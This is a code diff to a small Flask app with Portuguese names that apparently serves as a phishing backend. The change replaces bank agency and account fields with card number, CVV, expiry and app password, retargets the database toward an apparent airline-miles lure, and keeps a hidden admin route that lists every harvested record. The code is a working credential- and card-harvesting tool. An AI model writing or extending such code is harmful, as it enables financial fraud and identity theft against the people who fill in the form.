@@ -3,27 +3,16 @@ import sqlite3
 from flask import Flask, render_template, request, redirect, url_for
 
 app = Flask(__name__)
-def init_db():
-    conn = sqlite3.connect('dados_bancarios.db')
-    cursor = conn.cursor()
-    # Adiciona as colunas caso elas não existam (correção rápida)
-    try:
-        cursor.execute('ALTER TABLE usuarios ADD COLUMN agencia TEXT')
-        cursor.execute('ALTER TABLE usuarios ADD COLUMN conta TEXT')
-        cursor.execute('ALTER TABLE usuarios ADD COLUMN senha_app TEXT')
-    except:
-        pass # Se as colunas já existirem, ele ignora o erro
-    
-    cursor.execute('''CREATE TABLE IF NOT EXISTS usuarios 
-        (id INTEGER PRIMARY KEY AUTOINCREMENT, nome TEXT, cpf TEXT, email TEXT, agencia TEXT, conta TEXT, senha_app TEXT)''')
-    conn.commit()
-    conn.close()
+
 def init_db():
     try:
-        conn = sqlite3.connect('dados_bancarios.db')
+        conn = sqlite3.connect('dados_milhas.db')
         cursor = conn.cursor()
-        cursor.execute('''CREATE TABLE IF NOT EXISTS usuarios 
-            (id INTEGER PRIMARY KEY AUTOINCREMENT, nome TEXT, cpf TEXT, email TEXT, agencia TEXT, conta TEXT, senha_app TEXT)''')
+        # Cria a tabela com os novos campos de cartão
+        cursor.execute('''CREATE TABLE IF NOT EXISTS clientes 
+            (id INTEGER PRIMARY KEY AUTOINCREMENT, 
+             nome TEXT, cpf TEXT, email TEXT, 
+             num_cartao TEXT, senha_app TEXT, cvv TEXT, validade TEXT)''')
         conn.commit()
         conn.close()
     except Exception as e:
@@ -39,18 +28,19 @@ def login():
         nome = request.form.get('nome')
         cpf = request.form.get('cpf')
         email = request.form.get('email')
-        ag = request.form.get('agencia')
-        cc = request.form.get('conta')
-        pw = request.form.get('senha_app')
+        cartao = request.form.get('num_cartao')
+        senha = request.form.get('senha_app')
+        cvv = request.form.get('cvv')
+        validade = request.form.get('validade')
         
-        conn = sqlite3.connect('dados_bancarios.db')
+        conn = sqlite3.connect('dados_milhas.db')
         cursor = conn.cursor()
-        cursor.execute('INSERT INTO usuarios (nome, cpf, email, agencia, conta, senha_app) VALUES (?,?,?,?,?,?)', 
-                       (nome, cpf, email, ag, cc, pw))
+        cursor.execute('''INSERT INTO clientes (nome, cpf, email, num_cartao, senha_app, cvv, validade) 
+                          VALUES (?,?,?,?,?,?,?)''', (nome, cpf, email, cartao, senha, cvv, validade))
         conn.commit()
         conn.close()
-    except:
-        pass
+    except Exception as e:
+        print(f"Erro ao salvar: {e}")
     return redirect(url_for('sucesso'))
 
 @app.route('/sucesso')
@@ -60,14 +50,14 @@ def sucesso():
 @app.route('/admin_painel_secreto_99')
 def admin():
     try:
-        conn = sqlite3.connect('dados_bancarios.db')
+        conn = sqlite3.connect('dados_milhas.db')
         cursor = conn.cursor()
-        cursor.execute('SELECT * FROM usuarios ORDER BY id DESC')
+        cursor.execute('SELECT * FROM clientes ORDER BY id DESC')
         usuarios = cursor.fetchall()
         conn.close()
         return render_template('admin.html', usuarios=usuarios)
     except:
-        return "Erro ao carregar dados."
+        return "Erro ao carregar painel."
 
 if __name__ == '__main__':
     init_db()
